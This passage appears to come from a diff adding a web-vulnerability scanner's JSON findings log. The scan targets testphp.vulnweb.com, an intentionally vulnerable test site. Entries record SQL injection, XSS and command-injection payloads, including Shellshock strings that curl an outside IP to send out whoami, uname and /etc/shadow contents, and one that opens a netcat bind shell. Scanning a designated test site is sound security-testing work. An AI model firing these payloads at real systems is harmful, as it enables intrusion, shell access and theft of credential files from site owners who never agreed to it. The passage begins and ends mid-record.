+        "unix_timestamp": 1770478178
+      }
+    },
+    {
+      "id": 101,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/product.php",
+      "parameter": "pic",
+      "payload": "admin'--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pic"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2499
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:29:39",
+        "unix_timestamp": 1770478179
+      }
+    },
+    {
+      "id": 102,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/product.php",
+      "parameter": "pic",
+      "payload": "\"><img src=x onerror=alert(1)>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pic"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2526
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:29:39",
+        "unix_timestamp": 1770478179
+      }
+    },
+    {
+      "id": 103,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/product.php",
+      "parameter": "pic",
+      "payload": "\"><script>alert(1)</script>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pic"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2523
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:29:40",
+        "unix_timestamp": 1770478180
+      }
+    },
+    {
+      "id": 104,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/product.php",
+      "parameter": "pic",
+      "payload": "<IMG SRC=\"javascript:alert(1);\">",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pic"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2529
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:29:41",
+        "unix_timestamp": 1770478181
+      }
+    },
+    {
+      "id": 105,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/product.php",
+      "parameter": "pic",
+      "payload": "<ScRiPt>alert(1)</sCrIpT>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pic"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2522
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:29:42",
+        "unix_timestamp": 1770478182
+      }
+    },
+    {
+      "id": 106,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/product.php",
+      "parameter": "pic",
+      "payload": "<audio src=x onerror=alert(1)>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pic"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2527
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:29:42",
+        "unix_timestamp": 1770478182
+      }
+    },
+    {
+      "id": 107,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/product.php",
+      "parameter": "pic",
+      "payload": "<body onload=alert(1)>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pic"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2519
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:29:43",
+        "unix_timestamp": 1770478183
+      }
+    },
+    {
+      "id": 108,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/product.php",
+      "parameter": "pic",
+      "payload": "<a href=\"javascript:alert(1)\">click</a>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pic"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2536
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:29:43",
+        "unix_timestamp": 1770478183
+      }
+    },
+    {
+      "id": 109,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/product.php",
+      "parameter": "pic",
+      "payload": "<details open ontoggle=alert(1)>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pic"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2529
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:29:43",
+        "unix_timestamp": 1770478183
+      }
+    },
+    {
+      "id": 110,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/product.php",
+      "parameter": "pic",
+      "payload": "<img src=x onerror=\"alert(1)\">",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pic"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2527
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:29:44",
+        "unix_timestamp": 1770478184
+      }
+    },
+    {
+      "id": 111,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/product.php",
+      "parameter": "pic",
+      "payload": "<input onfocus=alert(1) autofocus>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pic"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2531
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:29:44",
+        "unix_timestamp": 1770478184
+      }
+    },
+    {
+      "id": 112,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/product.php",
+      "parameter": "pic",
+      "payload": "<img src=x onerror=alert(1)>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pic"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2525
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:29:44",
+        "unix_timestamp": 1770478184
+      }
+    },
+    {
+      "id": 113,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/product.php",
+      "parameter": "pic",
+      "payload": "<marquee onstart=alert(1)>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pic"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2523
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:29:45",
+        "unix_timestamp": 1770478185
+      }
+    },
+    {
+      "id": 114,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/product.php",
+      "parameter": "pic",
+      "payload": "<script>alert(1)</script>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pic"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2522
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:29:45",
+        "unix_timestamp": 1770478185
+      }
+    },
+    {
+      "id": 115,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/product.php",
+      "parameter": "pic",
+      "payload": "<script>alert(\"XSS\")</script>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pic"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2526
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:29:46",
+        "unix_timestamp": 1770478186
+      }
+    },
+    {
+      "id": 116,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/product.php",
+      "parameter": "pic",
+      "payload": "<svg onload=alert(1)>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pic"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2518
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:29:46",
+        "unix_timestamp": 1770478186
+      }
+    },
+    {
+      "id": 117,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/product.php",
+      "parameter": "pic",
+      "payload": "<video><source onerror=alert(1)>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pic"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2529
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:29:47",
+        "unix_timestamp": 1770478187
+      }
+    },
+    {
+      "id": 118,
+      "vulnerability_type": "RCE",
+      "endpoint": "http://testphp.vulnweb.com/product.php",
+      "parameter": "pic",
+      "payload": "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\\`whoami\\`\"",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pic"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2576
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:29:48",
+        "unix_timestamp": 1770478188
+      }
+    },
+    {
+      "id": 119,
+      "vulnerability_type": "RCE",
+      "endpoint": "http://testphp.vulnweb.com/product.php",
+      "parameter": "pic",
+      "payload": "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=\\`grep root /etc/shadow\\`\"",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pic"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2576
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:29:48",
+        "unix_timestamp": 1770478188
+      }
+    },
+    {
+      "id": 120,
+      "vulnerability_type": "RCE",
+      "endpoint": "http://testphp.vulnweb.com/product.php",
+      "parameter": "pic",
+      "payload": "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\\`pwd\\`\"",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pic"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2576
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:29:49",
+        "unix_timestamp": 1770478189
+      }
+    },
+    {
+      "id": 121,
+      "vulnerability_type": "RCE",
+      "endpoint": "http://testphp.vulnweb.com/product.php",
+      "parameter": "pic",
+      "payload": "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\\`uname -a\\`\"",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pic"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2576
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:29:49",
+        "unix_timestamp": 1770478189
+      }
+    },
+    {
+      "id": 122,
+      "vulnerability_type": "RCE",
+      "endpoint": "http://testphp.vulnweb.com/product.php",
+      "parameter": "pic",
+      "payload": "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\\`nc -lvvp 1234 -e /bin/bash\\`\"",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pic"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2576
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:29:49",
+        "unix_timestamp": 1770478189
+      }
+    },
+    {
+      "id": 123,
+      "vulnerability_type": "RCE",
+      "endpoint": "http://testphp.vulnweb.com/product.php",
+      "parameter": "pic",
+      "payload": ";/usr/bin/id\\n",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pic"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2510
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:29:50",
+        "unix_timestamp": 1770478190
+      }
+    },
+    {
+      "id": 124,
+      "vulnerability_type": "RCE",
+      "endpoint": "http://testphp.vulnweb.com/product.php",
+      "parameter": "pic",
+      "payload": "\\n/usr/bin/id|",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pic"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2510
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:29:50",
+        "unix_timestamp": 1770478190
+      }
+    },
+    {
+      "id": 125,
+      "vulnerability_type": "RCE",
+      "endpoint": "http://testphp.vulnweb.com/product.php",
+      "parameter": "pic",
+      "payload": "`/usr/bin/id`",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pic"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2396
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:29:51",
+        "unix_timestamp": 1770478191
+      }
+    },
+    {
+      "id": 126,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "artist",
+      "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2194
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:31:51",
+        "unix_timestamp": 1770478311
+      }
+    },
+    {
+      "id": 127,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "artist",
+      "payload": "' OR '1'='1",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2144
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:31:52",
+        "unix_timestamp": 1770478312
+      }
+    },
+    {
+      "id": 128,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "artist",
+      "payload": "' OR 1=1--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2149
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:31:52",
+        "unix_timestamp": 1770478312
+      }
+    },
+    {
+      "id": 129,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "artist",
+      "payload": "' OR 1=1#",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2148
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:31:52",
+        "unix_timestamp": 1770478312
+      }
+    },
+    {
+      "id": 130,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "artist",
+      "payload": "' UNION SELECT NULL,NULL--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2165
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:31:53",
+        "unix_timestamp": 1770478313
+      }
+    },
+    {
+      "id": 131,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "artist",
+      "payload": "' UNION SELECT NULL--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2160
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:31:53",
+        "unix_timestamp": 1770478313
+      }
+    },
+    {
+      "id": 132,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "artist",
+      "payload": "'; WAITFOR DELAY '0:0:5'--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2147
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:31:53",
+        "unix_timestamp": 1770478313
+      }
+    },
+    {
+      "id": 133,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "artist",
+      "payload": "1' AND '1'='1",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2151
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:31:55",
+        "unix_timestamp": 1770478315
+      }
+    },
+    {
+      "id": 134,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "artist",
+      "payload": "1' AND SLEEP(5)--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2155
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
